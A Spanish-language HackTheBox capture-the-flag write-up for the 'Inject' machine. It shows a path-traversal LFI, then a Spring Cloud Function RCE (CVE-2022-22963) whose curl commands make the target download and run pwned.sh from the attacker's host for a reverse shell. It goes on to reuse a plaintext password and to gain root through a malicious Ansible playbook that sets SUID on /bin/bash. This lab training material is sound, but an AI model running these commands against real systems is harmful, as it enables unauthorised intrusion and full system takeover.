

## About Inject HTB:


Se trata de una máquina de nivel de dificultad fácil en la cual aprovechamos una vulnerabilidad de carga de archivos para que la página nos muestre cómo podemos acceder a ellos. La página utiliza un parámetro en el método GET para acceder a archivos del sistema, lo cual nos permite explotar un LFI mediante el uso de la técnica Directory Path Traversal. 

#### Shell as Frank

Después de realizar una breve enumeración en el directorio donde se encuentra alojado el servicio web, detectamos la presencia del framework Spring Boot. Aprovechamos una vulnerabilidad de este framework que nos permite lograr la ejecución remota de código. De esta manera, obtenemos acceso al sistema como el usuario "frank" .

#### Shell as Phil

Posteriormente, procedemos a enumerar el directorio personal del usuario "phil" y logramos acceder a un archivo que contenía credenciales almacenadas. Utilizamos estas credenciales para acceder como "phil".

#### Shell as Root

Para escalar nuestros privilegios a "root", aprovechamos una tarea cron abusando de archivos con extensión YML y utilizamos la herramienta "ansible-parallel", siendo esta la que se ejecuta a intervalos regulares.



```
Machine: Inject
Difficult: Easy
Platform: HackTheBox
Release: Released on 3/11/2023
```



#### Reconocimiento: 


Escaneo de puertos con nmap:

```
elswix@parrot > nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.35.222 -oG tcpPorts


PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63


```


Realizamos un escaneo para reconocer las tecnologías y servicios que se ejecutan en los puertos reportados. En este caso, solo hay dos puertos, pero si hubiera más puertos abiertos, gracias a que almacenamos el escaneo en un formato grepable, podemos utilizar expresiones regulares para filtrar todos los puertos y formatearlos adecuadamente para llevar a cabo el escaneo con nmap.

```
elswix@parrot > cat tcpPorts | grep -oP '\d{1,5}/open' | awk '{print $1}' FS="/" | xargs | tr ' ' ',' | tr -d '\n'

22,8080
```


Escaneo exhaustivo de tecnologías y servicios que corren bajo los puertos 22 y 8080:  

```
elswix@parrot > nmap -sCV -p22,8080 10.129.35.222 -oN fullScan

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA)
|   256 d51c81c97b076b1cc1b429254b52219f (ECDSA)
|_  256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519)
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



Actualmente, dado que no disponemos de credenciales, debemos evitar hacer un uso excesivo del servicio SSH en el puerto 22. En su lugar, debemos enumerar e investigar el puerto 8080, que aparentemente corresponde a un servicio web.

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/ES/Machines/Easy/Inject/img/1.png?raw=true)


  
Después de revisar las tecnologías utilizadas por el servicio web utilizando la extensión [Wappalyzer](https://www.wappalyzer.com/) en nuestro navegador, no hemos encontrado ninguna información relevante o interesante.

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/ES/Machines/Easy/Inject/img/2.png?raw=true)

Podemos observar que en la página hay un reproductor de video de YouTube que muestra el siguiente video:

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/ES/Machines/Easy/Inject/img/3.png?raw=true)

Aún así, esto no es muy relevante que digamos. 

Tras examinar la página con más detenimiento, observamos que hay una sección en la parte superior derecha de la página web que indica "Upload" (subir).


![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/ES/Machines/Easy/Inject/img/0.png?raw=true)


Nos dirigimos a esa sección y notamos que se solicita subir un archivo.

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/ES/Machines/Easy/Inject/img/4.png?raw=true)


Procederé a crear un archivo de texto (.txt) con un contenido de prueba para verificar si se puede subir. Lo guardaré en el directorio "Downloads" para facilitar su ubicación y agilizar su acceso.

```
elswix@parrot > echo "Hola, esto es una prueba" > /home/elswix/Downloads/test.txt
```


Intentamos subirlo: 

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/ES/Machines/Easy/Inject/img/5.png?raw=true)

Podemos ver que estás solicitando que subamos archivos que sean imágenes. Probaré con una imagen cualquiera de Google con la extensión .jpg.

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/ES/Machines/Easy/Inject/img/6.png?raw=true)


Perfecto, el archivo se ha subido correctamente. Puedes ver que te invita a visualizar tu imagen, lo que significa que efectivamente se ha guardado en algún lugar.

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/ES/Machines/Easy/Inject/img/7.png?raw=true)


Ha funcionado correctamente; la imagen ha sido subida y podemos visualizarla.


En este punto, es crucial mantener una vigilancia activa, especialmente desde la perspectiva de un hacker, ya que la imagen no se muestra mediante la búsqueda directa en un directorio específico, como por ejemplo: `/uploads/gato.jpg`. En cambio, se emplea una sección que espera recibir el parámetro "img" a través del método GET, lo cual permite que dicho parámetro apunte directamente al archivo que hemos subido en el sistema. Este escenario plantea un posible riesgo, ya que podríamos intentar aprovecharlo para provocar una inclusión local de archivos (LFI), con el objetivo de acceder a archivos a nivel de sistema.


Por ejemplo: 

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/ES/Machines/Easy/Inject/img/8.png?raw=true)

Observamos que no ha funcionado como se esperaba. Esto podría deberse a que se está buscando el directorio "/etc" dentro del directorio actual, el cual podría no existir.

En vista de esto, procederemos a probar una técnica básica de inyección conocida como "Directory Path Traversal", la cual nos permitiría retroceder varios directorios hasta llegar a la raíz del sistema y luego agregar "/etc/passwd". Cabe mencionar que el archivo "/etc/passwd" debería existir si se logra realizar el Directory Path Traversal con éxito.


![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/ES/Machines/Easy/Inject/img/9.png?raw=true)
Hemos logrado realizar un "Directory Path Traversal" exitosamente, y parece ser que el archivo existe. Sin embargo, debido a las limitaciones de mostrar solo imágenes, no se nos muestra el contenido del archivo en cuestión.

No obstante, no todo está perdido. Podemos intentar hacer la misma solicitud utilizando la herramienta `curl` a través de la consola:

```
elswix@parrot > curl -s 'http://10.129.35.222:8080/show_image?img=../../../../../../../../../../etc/passwd'

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
frank:x:1000:1000:frank:/home/frank:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
phil:x:1001:1001::/home/phil:/bin/bash
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:997:996::/var/log/laurel:/bin/false

```

Ha funcionado. Hemos logrado provocar un LFI. Ahora podemos visualizar archivos a los cuales no deberíamos tener acceso a través del sitio web de la máquina víctima, aprovechando esta vulnerabilidad.


### Shell as Frank

Luego de enumerar un poco el sistema, logramos ver que emplea Spring Framework:

```
elswix@parrot > curl -s 'http://10.129.35.222:8080/show_image?img=../../../pom.xml'

<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
	<modelVersion>4.0.0</modelVersion>
	<parent>
		<groupId>org.springframework.boot</groupId>
		<artifactId>spring-boot-starter-parent</artifactId>
		<version>2.6.5</version>
		<relativePath/> <!-- lookup parent from repository -->
	</parent>
	<groupId>com.example</groupId>
	<artifactId>WebApp</artifactId>
	<version>0.0.1-SNAPSHOT</version>
	<name>WebApp</name>
	<description>Demo project for Spring Boot</description>
	<properties>
		<java.version>11</java.version>
	</properties>
	<dependencies>
		<dependency>
  			<groupId>com.sun.activation</groupId>
  			<artifactId>javax.activation</artifactId>
  			<version>1.2.0</version>
		</dependency>

		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-thymeleaf</artifactId>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-web</artifactId>
		</dependency>

		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-devtools</artifactId>
			<scope>runtime</scope>
			<optional>true</optional>
		</dependency>

		<dependency>
			<groupId>org.springframework.cloud</groupId>
			<artifactId>spring-cloud-function-web</artifactId>
			<version>3.2.2</version>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-test</artifactId>
			<scope>test</scope>
		</dependency>
		<dependency>
			<groupId>org.webjars</groupId>
			<artifactId>bootstrap</artifactId>
			<version>5.1.3</version>
		</dependency>
		<dependency>
			<groupId>org.webjars</groupId>
			<artifactId>webjars-locator-core</artifactId>
		</dependency>

	</dependencies>
	<build>
		<plugins>
			<plugin>
				<groupId>org.springframework.boot</groupId>
				<artifactId>spring-boot-maven-plugin</artifactId>
				<version>${parent.version}</version>
			</plugin>
		</plugins>
		<finalName>spring-webapp</finalName>
	</build>

</project>
```



Buscando un poco en internet, podemos encontrar una vulnerabilidad asociada a Spring Cloud, podemos realizar cietas pruebas de explotación y ver si logramos explotarla:

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/ES/Machines/Easy/Inject/img/10.png?raw=true)



Buscando el CVE por github, encontramos el siguiente repositorio:

[CVE-2022-22963](https://github.com/me2nuk/CVE-2022-22963)

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/ES/Machines/Easy/Inject/img/11.png?raw=true)

En este repositorio, hemos encontrado una sección que contiene un comando que nos permite, a través de una solicitud HTTP utilizando el método POST, ejecutar comandos de forma remota al aprovechar una función de Spring Cloud.

```
elswix@parrot > curl -X POST  http://10.129.35.222:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl 10.10.16.42/probando")' --data-raw 'data' -v
```


Estamos intentando que la máquina realice una solicitud a nuestro servidor web utilizando el comando "curl":

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/ES/Machines/Easy/Inject/img/12.png?raw=true)


Observamos que la máquina víctima realiza una solicitud GET a nuestro servidor HTTP creado con Python. Esto indica que hemos logrado la ejecución remota de comandos. Ahora solo queda enviar una Reverse Shell. Procederemos a crear un archivo que contenga el comando en una sola línea en bash para enviar la Reverse Shell.

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/ES/Machines/Easy/Inject/img/13.png?raw=true)


Ahora haremos que el servidor copie nuestro archivo `pwned.sh` y lo guarde en el directorio `/tmp`. Posteriormente, lo ejecutaremos para recibir la shell.


```
elswix@parrot > curl -X POST  http://10.129.35.222:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl 10.10.16.42/pwned.sh -o /tmp/pwned.sh")' --data-raw 'data' -v
```



![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/ES/Machines/Easy/Inject/img/14.png?raw=true)


Ahora, finalmente, procederemos a ejecutar el archivo que hemos almacenado en la ruta `/tmp/pwned.sh`.

```
elswix@parrot > curl -X POST  http://10.129.35.222:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /tmp/pwned.sh")' --data-raw 'data' -v
```

Antes de ejecutar el archivo, debemos asegurarnos de estar escuchando en el puerto 443 utilizando la herramienta netcat: 

```
elswix@parrot > nc -nlvp 443
```


![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/ES/Machines/Easy/Inject/img/15.png?raw=true)


### Shell as Phil

Al revisar el directorio personal del usuario "Frank", no encontramos la user flag, pero sí observamos un directorio llamado ".m2". Al ingresar a este directorio, encontramos el archivo "settings.xml" y podemos ver que contiene credenciales.

```
frank@inject > cat /home/frank/.m2/settings.xml
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>
```


Intentamos utilizar estas credenciales para realizar una migración al usuario "Phil" y comprobamos que son correctas: 

```
frank@inject > su phil
Password: DocPhillovestoInject123
phil@inject > 
```


### Shell as Root

Para elevar nuestros privilegios, lo primero que haremos será verificar si tenemos privilegios de sudoers, pero no encontramos ninguna configuración al respecto. Sin embargo, notamos que, como usuario "Phil", pertenecemos al grupo "staff" y tenemos la capacidad de modificar los contenidos del directorio "/opt/automation/tasks".

```
phil@inject > id 
uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)

```

```
phil@inject > find / -group staff 2>/dev/null
/opt/automation/tasks
/root
/var/local
/usr/local/lib/python3.8
/usr/local/lib/python3.8/dist-packages
/usr/local/lib/python3.8/dist-packages/ansible_parallel.py
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/LICENSE
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/RECORD
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/entry_points.txt
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/WHEEL
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/METADATA
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/top_level.txt
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/INSTALLER
/usr/local/lib/python3.8/dist-packages/__pycache__
/usr/local/lib/python3.8/dist-packages/__pycache__/ansible_parallel.cpython-38.pyc
/usr/local/share/fonts
/usr/local/share/fonts/.uuid

```



Considerando que el directorio se denomina "automation" y que contiene una tarea en su subdirectorio "tasks", podemos intentar verificar si nuestra suposición es correcta y si existe una tarea que se ejecuta a intervalos regulares de tiempo. Para lograr esto, podemos utilizar la herramienta denominada [pspy](https://github.com/DominicBreuker/pspy).



Después de dejarlo ejecutándose durante un tiempo, observamos que el usuario root ejecuta lo siguiente:

![](https://github.com/ElSwix/HTB-WriteUPS/blob/main/ES/Machines/Easy/Inject/img/16.png?raw=true)


Al revisar el directorio `/opt/automation/tasks/`, hemos encontrado un archivo llamado `playbook_1.yml`, pero este archivo pertenece al usuario root y no tenemos permisos de escritura en él. Sin embargo, hemos notado que la tarea que se ejecuta periódicamente ejecuta todos los archivos en ese directorio que tienen la extensión .yml. Por lo tanto, podemos intentar aprovechar esta circunstancia para realizar acciones no autorizadas.


Después de realizar una búsqueda en Internet, hemos encontrado una página que nos muestra cómo ejecutar comandos utilizando este tipo de archivos. Puedes consultar el siguiente enlace para obtener más información: [Enlace a la página](https://docs.ansible.com/ansible/latest/playbook_guide/playbooks_strategies.html)


  
Básicamente, deberíamos crear un archivo .yml con el siguiente contenido:

```

---
- name: test play
  hosts: webservers
  serial: 3
  gather_facts: False

  tasks:
    - name: first task
      command: hostname
    - name: second task
      command: hostname
      
```


Con esto, podríamos aprovechar el hecho de que root ejecuta las tareas para ejecutar comandos con privilegios. En este caso, ejecutaremos el comando `chmod u+s /bin/bash` para asignar el privilegio SUID a `/bin/bash`.



```
---
- name: test play
  hosts: localhost
  serial: 3
  gather_facts: False

  tasks:
    - name: first task
      command: chmod u+s /bin/bash
```

A continuación, guardaremos este contenido en un archivo llamado `pwned.yml` en el directorio `/opt/automation/tasks/`. Después de unos minutos, el archivo `/bin/bash` adquirirá el atributo SUID.

```
phil@inject > ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

Ahora solo nos queda ejecutar el comando `bash -p` para obtener una shell como root.

```
phil@inject > bash -p
bash-5.0# whoami
root
bash-5.0# cat /root/root.txt
b1e**************************205
bash-5.0# 
```



### Thank you for reading:

+  [Instagram](https://www.instagram.com/elswix_/)
+  [YouTube](https://www.youtube.com/@ElSwix)
+  [Twitter](https://twitter.com/elswix_)
+  [HackTheBox](https://app.hackthebox.com/profile/935172)


#### My Blog: 

+ [WebHackology - Pentesting & Web Development](https://webhackology.vercel.app/)


